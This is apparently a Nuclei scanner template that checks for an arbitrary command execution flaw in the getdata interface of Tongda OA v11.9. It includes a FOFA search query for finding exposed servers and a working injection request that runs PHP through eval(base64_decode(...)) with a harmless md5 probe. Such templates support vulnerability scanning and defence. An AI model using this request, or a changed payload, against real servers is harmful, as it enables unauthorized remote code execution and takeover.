id: tongda-oa-getdata-rce

info:
  name: 通达 OA v11.9 getadata - rce
  author: SleepingBag945
  severity: critical
  description: There is an arbitrary command execution vulnerability in the getdata interface of Tongda OA v11.9. An attacker can execute arbitrary commands on the server to control server permissions through the vulnerability.
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="TDXK-通达OA" && icon_hash="-759108386"
  tags: tongda,rce,oa

variables:
  num: '999999999'
  payload: "echo md5({{num}});"

http:
  - raw:
      - |
        GET /general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '{{md5(num)}}'
          - 'pagelimit'
        condition: and

      - type: status
        status:
          - 200

